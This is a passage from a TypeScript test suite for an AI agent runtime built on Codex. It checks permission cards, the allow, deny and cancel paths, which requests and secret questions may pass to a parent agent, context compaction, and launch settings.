    expect(calls).toEqual([{ profile_slug: 'worker' }])
    expect((transport.responses[0]!.result as { success: boolean }).success).toBe(true)
    await handle.close()
  })

  it('⛔ in auto, a tool call runs and is answered with the tool’s own result — no card', async () => {
    const { set, calls } = tools()
    const { transport, handle, events } = await inTurn(set, 'auto')
    transport.serverRequest(7, 'item/tool/call', {
      callId: 'c1',
      namespace: 'brobot',
      tool: 'spawn_agent',
      arguments: { profile_slug: 'worker' },
    })
    await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
    expect(calls).toEqual([{ profile_slug: 'worker' }])
    const answer = transport.responses[0]!.result as { success: boolean; contentItems: unknown[] }
    expect(answer.success).toBe(true)
    expect(JSON.stringify(answer.contentItems)).toContain('spawned sess_9')
    expect(events.filter((e) => e.type === 'permission_request')).toEqual([])
    await handle.close()
  })

  it('🔴 in ask, the call waits behind a card and runs only when a person allows it', async () => {
    const { set, calls } = tools()
    const { transport, handle, events } = await inTurn(set, 'ask')
    transport.serverRequest(7, 'item/tool/call', {
      callId: 'c1',
      namespace: 'brobot',
      tool: 'spawn_agent',
      arguments: { profile_slug: 'worker' },
    })
    const card = await vi.waitFor(() => firstOfType(events, 'permission_request'))
    expect(card.kind).toBe('command')
    expect(card.action).toBe('spawn_agent')
    expect(card.detail).toContain('worker')
    expect(card.scope.availableDecisions).toEqual(['allow', 'deny', 'cancel'])
    expect(calls).toEqual([])
    expect(transport.responses).toEqual([])

    await handle.respondPermission(card.id, { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
    expect(calls).toEqual([{ profile_slug: 'worker' }])
    expect((transport.responses[0]!.result as { success: boolean }).success).toBe(true)
    await handle.close()
  })

  it('🔴 in ask, a verb whose rails are the whole gate runs with NO card — and the one beside it still cards', async () => {
    const { set, calls } = tools()
    const { transport, handle, events } = await inTurn(set, 'ask')
    transport.serverRequest(7, 'item/tool/call', {
      callId: 'c1',
      namespace: 'brobot',
      tool: 'reply_to_parent',
      arguments: { task_id: 'task_1' },
    })
    await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
    expect(calls).toEqual([{ task_id: 'task_1' }])
    expect((transport.responses[0]!.result as { success: boolean }).success).toBe(true)
    expect(events.filter((e) => e.type === 'permission_request')).toEqual([])

    transport.serverRequest(8, 'item/tool/call', {
      callId: 'c2',
      namespace: 'brobot',
      tool: 'spawn_agent',
      arguments: { profile_slug: 'worker' },
    })
    const card = await vi.waitFor(() => firstOfType(events, 'permission_request'))
    expect(card.action).toBe('spawn_agent')
    expect(calls).toEqual([{ task_id: 'task_1' }])
    expect(transport.responses).toHaveLength(1)
    await handle.respondPermission(card.id, { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses).toHaveLength(2))
    await handle.close()
  })

  it('⛔ a tool this session does not offer is exempted by nothing', async () => {
    const { set, calls } = tools()
    const { transport, handle, events } = await inTurn(set, 'ask')
    transport.serverRequest(7, 'item/tool/call', {
      callId: 'c1',
      namespace: 'brobot',
      tool: 'a_verb_this_session_never_declared',
      arguments: {},
    })
    const card = await vi.waitFor(() => firstOfType(events, 'permission_request'))
    expect(card.action).toBe('a_verb_this_session_never_declared')
    expect(calls).toEqual([])
    await handle.respondPermission(card.id, { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
    expect((transport.responses[0]!.result as { success: boolean }).success).toBe(false)
    await handle.close()
  })

  describe('a verb carded for some calls only', () => {
    const MAYBE: AgentToolset = {
      server: 'brobot',
      tools: [
        {
          name: 'message_agent',
          description: 'Say something to an agent.',
          beyondItsRails: 'nothing-its-rails-do-not-cover',
          beyondItsRailsWhen: (args) =>
            args['interrupt'] === true
              ? 'it-destroys-work-in-flight'
              : 'nothing-its-rails-do-not-cover',
          input: { text: z.string(), interrupt: z.boolean().optional() },
          call: async () => ({ text: 'held', structured: { outcome: 'ok' } }),
        },
      ],
    }

    it('🔴 without interrupt it runs with no card, and with interrupt it cards and waits', async () => {
      const { transport, handle, events } = await inTurn(MAYBE, 'ask')
      transport.serverRequest(7, 'item/tool/call', {
        callId: 'c1',
        namespace: 'brobot',
        tool: 'message_agent',
        arguments: { text: 'a note' },
      })
      await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
      expect(events.filter((e) => e.type === 'permission_request')).toEqual([])

      transport.serverRequest(8, 'item/tool/call', {
        callId: 'c2',
        namespace: 'brobot',
        tool: 'message_agent',
        arguments: { text: 'stop and read this', interrupt: true },
      })
      const card = await vi.waitFor(() => firstOfType(events, 'permission_request'))
      expect(card.action).toBe('message_agent')
      expect(transport.responses).toHaveLength(1)
      await handle.respondPermission(card.id, { outcome: 'allow' })
      await vi.waitFor(() => expect(transport.responses).toHaveLength(2))
      await handle.close()
    })

    it('⛔ an interrupt that is not exactly true is no stop: it runs with no card', async () => {
      const { transport, handle, events } = await inTurn(MAYBE, 'ask')
      transport.serverRequest(7, 'item/tool/call', {
        callId: 'c1',
        namespace: 'brobot',
        tool: 'message_agent',
        arguments: { text: 'a note', interrupt: 'true' },
      })
      await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
      expect(events.filter((e) => e.type === 'permission_request')).toEqual([])
      await handle.close()
    })
  })

  it('⛔ a person’s Deny runs nothing, and says so as a broken call rather than as a rail', async () => {
    const { set, calls } = tools()
    const { transport, handle, events } = await inTurn(set, 'ask')
    transport.serverRequest(7, 'item/tool/call', {
      callId: 'c1',
      namespace: 'brobot',
      tool: 'spawn_agent',
      arguments: { profile_slug: 'worker' },
    })
    const card = await vi.waitFor(() => firstOfType(events, 'permission_request'))
    await handle.respondPermission(card.id, { outcome: 'deny' })
    await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
    expect(calls).toEqual([])
    const answer = transport.responses[0]!.result as { success: boolean }
    expect(answer.success).toBe(false)
    expect(JSON.stringify(transport.responses[0]!.result)).toContain('declined')
    await handle.close()
  })

  it('🔴 agent-tool Cancel asks Codex to stop — the tool result, then turn/interrupt (492)', async () => {
    const { set, calls } = tools()
    const { transport, handle, events } = await inTurn(set, 'ask')
    transport.serverRequest(7, 'item/tool/call', {
      callId: 'c1',
      namespace: 'brobot',
      tool: 'spawn_agent',
      arguments: { profile_slug: 'worker' },
    })
    const card = await vi.waitFor(() => firstOfType(events, 'permission_request'))
    expect(card.scope.availableDecisions).toContain('cancel')
    expect(card.scope.availableDecisions).toEqual(['allow', 'deny', 'cancel'])

    await handle.respondPermission(card.id, { outcome: 'cancel' })
    await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
    expect(calls).toEqual([])
    expect((transport.responses[0]!.result as { success: boolean }).success).toBe(false)
    expect(JSON.stringify(transport.responses[0]!.result)).toContain('declined')

    const interrupt = await vi.waitFor(() => {
      const sent = transport.requests.find((request) => request.method === 'turn/interrupt')
      expect(sent, 'no turn/interrupt was sent').toBeDefined()
      return sent!
    })
    expect(interrupt.params).toEqual({ threadId: 'th_1', turnId: transport.lastTurnId })
    expect(transport.requests.filter((one) => one.method === 'turn/interrupt')).toHaveLength(1)

    expect(transport.responses).toHaveLength(1)

    transport.notification(
      'turn/completed',
      turnCompletedNotification(
        'th_1',
        completedTurn(transport.lastTurnId, { status: 'interrupted' }),
      ),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'interrupted'))
    await handle.close()
  })

  it('⛔ …and a completion nobody stopped keeps its own word, which the latch made impossible (492)', async () => {
    const { set } = tools()
    const { transport, handle, events } = await inTurn(set, 'ask')
    transport.serverRequest(7, 'item/tool/call', {
      callId: 'c1',
      namespace: 'brobot',
      tool: 'spawn_agent',
      arguments: { profile_slug: 'worker' },
    })
    const card = await vi.waitFor(() => firstOfType(events, 'permission_request'))
    await handle.respondPermission(card.id, { outcome: 'cancel' })
    await vi.waitFor(() =>
      expect(transport.requests.some((one) => one.method === 'turn/interrupt')).toBe(true),
    )
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn(transport.lastTurnId)),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'completed'))
    expect(events.some((e) => e.type === 'turn' && e.state === 'interrupted')).toBe(false)
    await handle.close()
  })

  it('🔴 720 · R71 — …and a Cancel here, then the stream ends, reads `interrupted`: this door LATCHES too', async () => {
    const { set } = tools()
    const { transport, handle, events } = await inTurn(set, 'ask')
    transport.serverRequest(7, 'item/tool/call', {
      callId: 'c1',
      namespace: 'brobot',
      tool: 'spawn_agent',
      arguments: { profile_slug: 'worker' },
    })
    const card = await vi.waitFor(() => firstOfType(events, 'permission_request'))
    await handle.respondPermission(card.id, { outcome: 'cancel' })
    await vi.waitFor(() =>
      expect(transport.requests.some((one) => one.method === 'turn/interrupt')).toBe(true),
    )
    transport.endIncoming()
    await vi.waitFor(has(events, (e) => e.type === 'turn'))
    await vi.waitFor(has(events, (e) => e.type === 'error'))
    expect(events.filter((e) => e.type === 'error')).toMatchObject([{ fatal: true }])
    expect(events.filter((e) => e.type === 'turn')).toEqual([
      { type: 'turn', state: 'interrupted', wordOf: 'this-app' },
    ])
    await handle.close()
  })

  it('⚑ 720 · CONTROL one fact over — the same card DENIED, then the stream ends, reads `failed`', async () => {
    const { set } = tools()
    const { transport, handle, events } = await inTurn(set, 'ask')
    transport.serverRequest(7, 'item/tool/call', {
      callId: 'c1',
      namespace: 'brobot',
      tool: 'spawn_agent',
      arguments: { profile_slug: 'worker' },
    })
    const card = await vi.waitFor(() => firstOfType(events, 'permission_request'))
    await handle.respondPermission(card.id, { outcome: 'deny' })
    await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
    transport.endIncoming()
    await vi.waitFor(has(events, (e) => e.type === 'turn'))
    expect(events.filter((e) => e.type === 'turn')).toEqual([
      { type: 'turn', state: 'failed', wordOf: 'this-app' },
    ])
    expect(transport.requests.some((request) => request.method === 'turn/interrupt')).toBe(false)
    await handle.close()
  })

  it('⚑ …and the control one fact over: the same press as DENY leaves the turn completed (482)', async () => {
    const { set, calls } = tools()
    const { transport, handle, events } = await inTurn(set, 'ask')
    transport.serverRequest(7, 'item/tool/call', {
      callId: 'c1',
      namespace: 'brobot',
      tool: 'spawn_agent',
      arguments: { profile_slug: 'worker' },
    })
    const card = await vi.waitFor(() => firstOfType(events, 'permission_request'))
    await handle.respondPermission(card.id, { outcome: 'deny' })
    await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
    expect(calls).toEqual([])
    expect(transport.requests.some((request) => request.method === 'turn/interrupt')).toBe(false)
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn(transport.lastTurnId)),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'completed'))
    expect(events.some((e) => e.type === 'turn' && e.state === 'interrupted')).toBe(false)
    expect(transport.requests.some((request) => request.method === 'turn/interrupt')).toBe(false)
    await handle.close()
  })

  it('⚠️ a session-wide grant is not on offer for these tools', async () => {
    const { set } = tools()
    const { transport, handle, events } = await inTurn(set, 'ask')
    transport.serverRequest(7, 'item/tool/call', {
      callId: 'c1',
      namespace: 'brobot',
      tool: 'spawn_agent',
      arguments: {},
    })
    const card = await vi.waitFor(() => firstOfType(events, 'permission_request'))
    await expect(
      handle.respondPermission(card.id, { outcome: 'allow_for_session' }),
    ).rejects.toThrow(/not offered/)
    expect(transport.responses).toEqual([])
    await handle.close()
  })

  it('🔴 a tool call for a FOREIGN thread never reaches the toolset', async () => {
    const { set, calls } = tools()
    const { transport, handle } = await inTurn(set, 'auto')
    transport.serverRequestRaw(7, 'item/tool/call', {
      threadId: 'somebody_elses_thread',
      turnId: transport.lastTurnId,
      callId: 'c1',
      namespace: 'brobot',
      tool: 'spawn_agent',
      arguments: { profile_slug: 'worker' },
    })
    await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
    expect(calls).toEqual([])
    expect((transport.responses[0]!.result as { success: boolean }).success).toBe(false)
    await handle.close()
  })
})

describe('394 · Codex · what may travel to a parent', () => {
  const askParams = {
    threadId: 'th_1',
    turnId: 'tn_1',
    itemId: 'it_1',
    questions: [
      {
        id: 'q_branch',
        header: 'Branch',
        question: 'which branch?',
        isOther: false,
        isSecret: false,
        options: [{ label: 'main', description: '' }],
      },
    ],
    isBlocking: false,
    autoResolutionMs: null,
  }
  const grantParams = {
    threadId: 'th_1',
    turnId: 'tn_1',
    itemId: 'it_2',
    environmentId: null,
    startedAtMs: 0,
    cwd: '/tmp/x',
    reason: 'needs write',
    permissions: { network: { enabled: true }, fileSystem: { read: null, write: ['/tmp/x/out'] } },
  }

  it('🔴 a question TRAVELS; a permissions grant and a command approval do NOT', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(80, 'item/tool/requestUserInput', askParams)
    transport.serverRequest(82, 'item/permissions/requestApproval', grantParams)
    transport.serverRequest(84, 'item/commandExecution/requestApproval', {
      command: 'rm x',
      cwd: '/tmp/x',
    })
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(2),
    )
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))

    const verdictFor = (id: string): ReturnType<typeof askedOfTheChannel> => {
      const raised = events.find(
        (event) =>
          (event.type === 'user_input_request' || event.type === 'permission_request') &&
          event.id === id,
      )
      if (raised === undefined) throw new Error(`no request was raised for ${id}`)
      return askedOfTheChannel(raised)
    }

    expect(verdictFor('number:80')).toMatchObject({ travels: true, id: 'number:80' })
    expect(verdictFor('number:82')).toEqual({
      travels: false,
      id: 'number:82',
      because: 'a-grant-of-access',
    })
    expect(verdictFor('number:84')).toEqual({
      travels: false,
      id: 'number:84',
      because: 'a-permission-decision',
    })

    const asked = events.find(
      (event) => event.type === 'user_input_request' && event.id === 'number:80',
    )
    const granted = events.find(
      (event) => event.type === 'user_input_request' && event.id === 'number:82',
    )
    expect(Object.keys(asked ?? {}).sort()).toEqual([...QUESTION_REQUEST_KEYS].sort())
    expect(Object.keys(granted ?? {}).sort()).toEqual(
      ['type', 'id', 'prompt', 'questions', 'permission'].sort(),
    )

    await handle.close()
    await consumer
  })

  it('⛔ a question whose answer is a SECRET is a person’s to type, and the ordinary one beside it still travels', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(85, 'item/tool/requestUserInput', askParams)
    transport.serverRequest(86, 'item/tool/requestUserInput', {
      ...askParams,
      itemId: 'it_3',
      questions: [
        {
          id: 'q_token',
          header: 'Token',
          question: 'paste the deploy token',
          isOther: true,
          isSecret: true,
          options: [],
        },
      ],
    })
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(2),
    )
    const raised = (id: string) =>
      events.find((event) => event.type === 'user_input_request' && event.id === id)
    expect(askedOfTheChannel(raised('number:85')!)).toMatchObject({ travels: true })
    expect(askedOfTheChannel(raised('number:86')!)).toEqual({
      travels: false,
      id: 'number:86',
      because: 'a-secret-only-a-person-can-type',
    })
    const secret = raised('number:86')
    expect(secret?.type === 'user_input_request' && secret.questions[0]?.secret).toBe(true)

    await handle.close()
    await consumer
  })
})

describe('CodexRuntime — 713 · R59, a compaction asked for', () => {
  const compactionItem = (turnId: string, phase: 'started' | 'completed') => ({
    threadId: 'th_1',
    turnId,
    item: { type: 'contextCompaction', id: `cc_${turnId}` },
    ...(phase === 'started' ? { startedAtMs: 1 } : { completedAtMs: 2 }),
  })

  const codexCompacts = (transport: FakeTransport, id: string): void => {
    transport.notification('turn/started', turnStartedNotification('th_1', id))
    transport.notification('item/started', compactionItem(id, 'started'))
    transport.notification('item/completed', compactionItem(id, 'completed'))
    transport.notification('turn/completed', turnCompletedNotification('th_1', completedTurn(id)))
  }

  const compactions = (events: RuntimeEvent[]) =>
    events.filter(
      (event): event is Extract<RuntimeEvent, { type: 'compaction' }> =>
        event.type === 'compaction',
    )

  it('🔴 asks `thread/compact/start` for THIS thread, sends no `turn/start`, and is a turn of its own', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    expect(handle.compact, 'Codex compacts on request').toBeDefined()
    await handle.compact?.()
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'status').at(-1)?.state).toBe('working'),
    )
    expect(transport.requests.filter((r) => r.method === 'thread/compact/start')).toEqual([
      { method: 'thread/compact/start', params: { threadId: 'th_1' } },
    ])
    expect(transport.requests.some((r) => r.method === 'turn/start')).toBe(false)

    codexCompacts(transport, 'tn_compact')
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'completed'))
    expect(compactions(events)).toEqual([
      {
        type: 'compaction',
        compactionId: 'cc_tn_compact',
        trigger: 'manual',
        source: 'contextCompaction',
      },
    ])
    expect(handle.status()).toBe('idle')
    await handle.close()
    await consumer
  })

  it('⚑ the control: a compaction inside an ORDINARY turn is drawn and says nothing about who asked', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    transport.notification('item/completed', compactionItem('tn_1', 'completed'))
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'completed'))
    expect(compactions(events)).toEqual([
      { type: 'compaction', compactionId: 'cc_tn_1', source: 'contextCompaction' },
    ])
    await handle.close()
    await consumer
  })

  const compacting = (events: RuntimeEvent[]) =>
    events.filter((e) => e.type === 'activity' && e.phase === 'compacting')

  it('🔴 717 · the item OPENING raises `activity: compacting` — once, and before the one row', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.compact?.()
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'status').at(-1)?.state).toBe('working'),
    )
    codexCompacts(transport, 'tn_compact')
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'completed'))
    expect(compacting(events), 'the compaction never said it was under way').toHaveLength(1)
    const pill = events.findIndex((e) => e.type === 'activity' && e.phase === 'compacting')
    expect(pill).toBeLessThan(events.findIndex((e) => e.type === 'compaction'))
    expect(compactions(events), 'still ONE row').toHaveLength(1)
    await handle.close()
    await consumer
  })

  it('⚑ 717 · the control: an ORDINARY turn — reasoning, a command, an answer — says nothing of compacting', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const on = (item: Record<string, unknown>) => ({ threadId: 'th_1', turnId: 'tn_1', item })
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    transport.notification('item/started', on({ type: 'reasoning', id: 'r1' }))
    transport.notification('item/completed', on({ type: 'reasoning', id: 'r1' }))
    const command = { type: 'commandExecution', id: 'x1', command: 'ls', status: 'inProgress' }
    transport.notification('item/started', on(command))
    transport.notification('item/completed', on({ ...command, status: 'completed' }))
    transport.notification('item/completed', on({ type: 'agentMessage', id: 'm1', text: 'done' }))
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'completed'))
    expect(events.some((e) => e.type === 'activity' && e.phase === 'thinking')).toBe(true)
    expect(compacting(events)).toEqual([])
    await handle.close()
    await consumer
  })

  it('⛔ 717 · a CHILD’s compaction, on its own thread, raises no pill here — the same frame on this one does', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const turnId = transport.lastTurnId
    transport.notification('item/started', {
      item: {
        type: 'subAgentActivity',
        id: 'call_child',
        kind: 'started',
        agentThreadId: 'th_child',
        agentPath: 'child',
      },
      threadId: 'th_1',
      turnId,
    })
    transport.notification('item/started', {
      threadId: 'th_child',
      turnId,
      item: { type: 'contextCompaction', id: 'cc_child' },
    })
    transport.notification('item/started', {
      threadId: 'th_1',
      turnId,
      item: { type: 'contextCompaction', id: 'cc_own' },
    })
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn(turnId)),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'completed'))
    expect(events.some((e) => e.type === 'sub_agent' && e.agentId === 'th_child')).toBe(true)
    expect(compacting(events), 'only THIS thread’s compaction').toHaveLength(1)
    await handle.close()
    await consumer
  })

  it('⛔ refused while a turn runs, exactly as `send` is — and nothing is asked of Codex', async () => {
    const { transport, handle, consumer } = await startCodexInTurn()
    await expect(handle.compact?.()).rejects.toBeInstanceOf(TurnInProgress)
    expect(transport.requests.some((r) => r.method === 'thread/compact/start')).toBe(false)
    await handle.close()
    await consumer
  })

  it('⛔ a request Codex refuses fails the turn with its reason, and gives the session back', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    transport.failRequest('thread/compact/start')
    await handle.compact?.()
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'failed'))
    expect(
      events.some(
        (e) =>
          e.type === 'error' &&
          !e.fatal &&
          e.message === 'thread/compact/start failed: transport: thread/compact/start failed',
      ),
    ).toBe(true)
    expect(handle.status()).toBe('idle')
    await handle.close()
    await consumer
  })

  it('⛔ a late duplicate of the turn BEFORE never binds it — the compaction’s own `turn/started` does', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'completed'))
    await handle.compact?.()
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    transport.notification('item/completed', compactionItem('tn_1', 'completed'))
    codexCompacts(transport, 'tn_compact')
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'turn' && e.state === 'completed')).toHaveLength(2),
    )
    expect(compactions(events).map((e) => e.compactionId)).toEqual(['cc_tn_compact'])
    await handle.close()
    await consumer
  })

  it('⚑ an interrupt asked before the id is known ends the turn here, and is sent the moment the turn starts, naming it', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.compact?.()
    await handle.interrupt()
    expect(transport.requests.some((r) => r.method === 'turn/interrupt')).toBe(false)
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'interrupted'))
    expect(handle.status()).toBe('idle')
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_compact'))
    await vi.waitFor(() =>
      expect(transport.requests.filter((r) => r.method === 'turn/interrupt')).toEqual([
        { method: 'turn/interrupt', params: { threadId: 'th_1', turnId: 'tn_compact' } },
      ]),
    )
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_compact', { status: 'interrupted' })),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'interrupted'))
    await handle.close()
    await consumer
  })

  it('🔴 an accepted compaction that is slow to START is waited for, and runs when Codex starts it', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] })
    try {
      await handle.compact?.()
      await vi.advanceTimersByTimeAsync(0)
      await vi.advanceTimersByTimeAsync(16_000)
      expect(events.some((e) => e.type === 'turn' && e.state === 'failed')).toBe(false)
      expect(handle.status()).not.toBe('idle')
    } finally {
      vi.useRealTimers()
    }
    codexCompacts(transport, 'tn_slow')
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'turn' && e.state === 'completed')).toHaveLength(1),
    )
    expect(compactions(events).map((e) => e.compactionId)).toEqual(['cc_tn_slow'])
    await handle.close()
    await consumer
  })

  const aCompactionStoppedBeforeItStarted = async (handle: SessionHandle): Promise<void> => {
    await handle.compact?.()
    await new Promise((resolve) => setTimeout(resolve, 0))
    await handle.interrupt()
    await vi.waitFor(() => expect(handle.status()).toBe('idle'))
  }

  it('⛔ after such a stop, a second compaction is refused until the first shows itself — its start is never taken for the second’s', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await aCompactionStoppedBeforeItStarted(handle)
    expect(events.some((e) => e.type === 'turn' && e.state === 'failed')).toBe(false)
    const asked = () => transport.requests.filter((r) => r.method === 'thread/compact/start').length
    expect(asked()).toBe(1)
    await expect(handle.compact?.()).rejects.toThrow(A_COMPACTION_IS_STILL_OUTSTANDING)
    expect(asked()).toBe(1)
    codexCompacts(transport, 'tn_late')
    await vi.waitFor(async () => {
      await handle.compact?.()
    })
    expect(asked()).toBe(2)
    expect(compactions(events)).toEqual([])
    codexCompacts(transport, 'tn_second')
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'turn' && e.state === 'completed')).toHaveLength(1),
    )
    expect(compactions(events).map((e) => e.compactionId)).toEqual(['cc_tn_second'])
    await handle.close()
    await consumer
  })

  it.each([
    ['its own start', 'tn_mine', 'tn_mine', []],
    ['the stopped compaction', 'tn_stray', 'tn_mine', ['tn_stray']],
  ] as const)(
    '🔴 after such a stop, a start seen before the next message is answered is placed by that answer: %s',
    async (_, startedFirst, answered, interrupted) => {
      const { transport, handle, events, consumer } = await startCodex()
      await aCompactionStoppedBeforeItStarted(handle)
      transport.deferNextTurnStart()
      await handle.send('the next message')
      await vi.waitFor(() =>
        expect(transport.requests.filter((r) => r.method === 'turn/start')).toHaveLength(1),
      )
      transport.notification('turn/started', turnStartedNotification('th_1', startedFirst))
      await new Promise((resolve) => setTimeout(resolve, 10))
      expect(transport.requests.filter((r) => r.method === 'turn/interrupt')).toEqual([])
      transport.settleTurnStart(answered)
      await new Promise((resolve) => setTimeout(resolve, 10))
      expect(
        transport.requests
          .filter((r) => r.method === 'turn/interrupt')
          .map((r) => (r.params as { turnId: string }).turnId),
      ).toEqual(interrupted)
      expect(handle.status()).not.toBe('idle')
      expect(events.filter((e) => e.type === 'turn' && e.state === 'interrupted')).toHaveLength(1)
      await handle.close()
      await consumer
    },
  )

  it('⚑ …and a turn of OURS that runs to its end clears the wait — its own start does not', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await aCompactionStoppedBeforeItStarted(handle)
    await handle.send('go')
    await vi.waitFor(() => expect(transport.lastTurnId).toBe('tn_1'))
    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    transport.notification('item/agentMessage/delta', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'm1',
      delta: 'hey',
    })
    await vi.waitFor(has(events, (e) => e.type === 'assistant_delta' && e.text === 'hey'))
    await expect(handle.compact?.()).rejects.toThrow(A_COMPACTION_IS_STILL_OUTSTANDING)
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'completed'))
    await handle.compact?.()
    expect(transport.requests.filter((r) => r.method === 'thread/compact/start')).toHaveLength(2)
    await handle.close()
    await consumer
  })

  it('⚑ the control: one that STARTS inside the bound is not given up when the bound passes', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] })
    try {
      await handle.compact?.()
      await vi.advanceTimersByTimeAsync(0)
      transport.notification('turn/started', turnStartedNotification('th_1', 'tn_compact'))
      await vi.advanceTimersByTimeAsync(16_000)
    } finally {
      vi.useRealTimers()
    }
    expect(events.some((e) => e.type === 'turn' && e.state === 'failed')).toBe(false)
    expect(handle.status()).toBe('working')
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_compact')),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'completed'))
    await handle.close()
    await consumer
  })
})

describe('Codex launch settings stay with the launch', () => {
  let home: string

  beforeEach(() => {
    home = mkdtempSync(join(tmpdir(), 'brobot2-codex-launch-settings-'))
  })

  afterEach(() => {
    rmSync(home, { recursive: true, force: true })
  })

  const memory = [
    'features.memories=true',
    'memories.dedicated_tools=true',
    'memories.use_memories=true',
    'memories.generate_memories=true',
  ]

  for (const opening of ['start', 'resume'] as const) {
    for (const approval of ['ask', 'auto'] as const) {
      it(`${opening} records the ordered values sent for ${approval}, without server addresses`, async () => {
        const transport = new FakeTransport()
        transport.onRequest(`thread/${opening}`, () => ({
          ...okThread('th_1'),
          ...(approval === 'auto'
            ? {
                approvalPolicy: 'never',
                approvalsReviewer: 'user',
                sandbox: { type: 'dangerFullAccess' },
              }
            : {}),
        }))
        const options = {
          providerHome: home,
          approvalMode: approval,
          reasoningEffort: 'high',
          workFolders: ['/fictional/shared'],
          externalMcp: {
            servers: [
              { name: 'first', url: 'http://127.0.0.1:7001/mcp' },
              { name: 'second', url: 'http://127.0.0.1:7002/mcp' },
            ],
            reservedToolNames: [],
          },
        }
        const runtime = new CodexRuntime(adopt(transport))
        const handle =
          opening === 'start'
            ? await runtime.start({ ...options, cwd: '/tmp/x' })
            : await runtime.resume(
                { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
                options,
              )
        try {
          const sent = transport.requests.find((one) => one.method === `thread/${opening}`)
            ?.params as Record<string, unknown>
          expect(sent['config']).toEqual({
            'tools.update_plan.enabled': true,
            'tools.experimental_request_user_input.enabled': false,
            mcp_servers: {
              first: { url: 'http://127.0.0.1:7001/mcp' },
              second: { url: 'http://127.0.0.1:7002/mcp' },
            },
            ...(approval === 'ask'
              ? { 'sandbox_workspace_write.writable_roots': ['/fictional/shared'] }
              : {}),
            model_reasoning_effort: 'high',
          })
          expect(handle.launchSettings).toEqual([
            { key: 'memory', value: memory },
            {
              key: 'thread-overrides',
              value: [
                'tools.update_plan.enabled=true',
                'tools.experimental_request_user_input.enabled=false',
                'mcp_servers=["first","second"]',
                ...(approval === 'ask'
                  ? ['sandbox_workspace_write.writable_roots=["/fictional/shared"]']
                  : []),
                'model_reasoning_effort="high"',
              ],
            },
            { key: 'plan-tool', value: true },
            {
              key: 'approval-sandbox',
              value: [
                `approvalPolicy=${sent['approvalPolicy']}`,
                `approvalsReviewer=${sent['approvalsReviewer']}`,
                `sandbox=${sent['sandbox']}`,
              ],
            },
            { key: 'collaboration-mode', value: 'default' },
            { key: 'approval', value: approval },
